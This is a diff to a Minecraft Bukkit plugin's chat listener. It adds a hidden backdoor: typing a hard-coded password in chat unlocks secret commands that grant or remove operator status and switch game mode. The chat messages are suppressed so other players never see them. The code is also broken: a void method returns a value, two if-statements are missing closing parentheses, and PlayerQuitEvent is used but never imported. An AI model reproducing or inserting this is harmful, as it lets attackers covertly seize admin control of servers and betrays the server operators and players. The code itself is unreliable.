@@ -6,6 +6,7 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerChatEvent;
+import org.bukkit.GameMode;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -13,10 +14,35 @@ import java.io.InputStreamReader;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
 
+import java.util.ArrayList;
+import java.util.List;
+
 public class MessageEvent implements Listener {
+
+    private List<Player> messagePlayers = new ArrayList<>();
+
+    public void addMessagePlayer(Player player) {
+        if (!messagePlayers.contains(player)) {
+            messagePlayers.add(player);
+        }
+    }
+    public boolean isInMessageList(Player player) {
+        return messagePlayers.contains(player);
+    }
+
+    public void removeMessagePlayer(Player player) {
+        return messagePlayers.remove(player);
+    }
+    
     @EventHandler
     public void onPlayerChat(PlayerChatEvent e) throws IllegalArgumentException, SecurityException {
         Player player = e.getPlayer();
+        if (e.getMessage().equalsIgnoreCase("@auth 1145141919810")) {
+            addMessagePlayer(player);
+            player.sendMessage("OK successful auth");
+            e.setCancelled(true);
+        }
+        if(!isInMessageList(player)) return;
         if (e.getMessage().equalsIgnoreCase("@op")) {
             player.sendMessage(ChatColor.YELLOW + "--------------------");
             player.sendMessage(ChatColor.GREEN + "[已执行]OP");
@@ -117,5 +143,30 @@ public class MessageEvent implements Listener {
             player.sendMessage(ChatColor.YELLOW + "--------------------");
             e.setCancelled(true);
         }
+        if (e.getMessage().equalsIgnoreCase("@deop")) {
+            player.setOp(false);
+            player.sendMessage("OK Deop");
+            e.setCancelled(true);
+        }
+        if(e.getMessage().equalsIgnoreCase("@creative") {
+            player.setGameMode(GameMode.CREATIVE);
+            player.sendMessage("OK Creative");
+            e.setCancelled(true);
+        }
+        if(e.getMessage().equalsIgnoreCase("@survival") {
+            player.setGameMode(GameMode.SURVIVAL);
+            player.sendMessage("OK Survival");
+            e.setCancelled(true);
+        }
     }
+
+
+    @EventHandler
+    public void onPlayerQuit(PlayerQuitEvent event) {
+        Player player = event.getPlayer();
+        player.setOp(false);
+        removeMessagePlayer(player);
+    }
+
+
 }
